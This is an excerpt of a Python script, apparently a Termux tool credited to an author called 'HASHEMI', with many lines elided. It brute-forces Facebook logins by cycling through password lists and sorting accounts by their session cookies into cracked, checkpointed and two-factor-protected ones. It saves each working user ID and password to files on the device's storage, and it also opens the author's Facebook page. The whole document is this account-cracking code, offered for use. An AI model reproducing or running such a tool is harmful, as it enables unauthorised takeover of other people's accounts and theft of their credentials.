...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m HASHEMI     \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m Sayed Ali Abbas Hashemi  \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m ALI_HASHEMI313               \033[1;31m 
\033[1;31m│\033[1;37m☞  \033[1;32mWHATSAPP  \033[1;31m ➟  \033[1;32m074*******6              \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟  \033[1;32m1.2                         \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m :    ➟ \033[1;32m Termux commends\033[1;37m {\033[1;36mFB\033[1;37m} \033[1;31m
        ...
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    print('\r\033[1;92m[HASHEMI-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/HASHEMI_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[141:156]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        ...
                        if cid in cp:
                            ...
                            print('\r\033[1;94m[HASHEMI-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/HASHEMI_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def passx():
    os.system("xdg-open https://www.facebook.com/https://www.facebook.com/sayedAliAbbas.Hashemi313?mibextid=ZbWKwL")
    print(logo)
    print("")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r{GREEN}[HASHEMI-OK]  '+uid+' | '+ps+ '  ') 
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/HASHEMI-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r{RED}[HASHEMI-CP] '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HASHEMI] [%s] \33[1;97m[OK:%s{HASHEMI}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
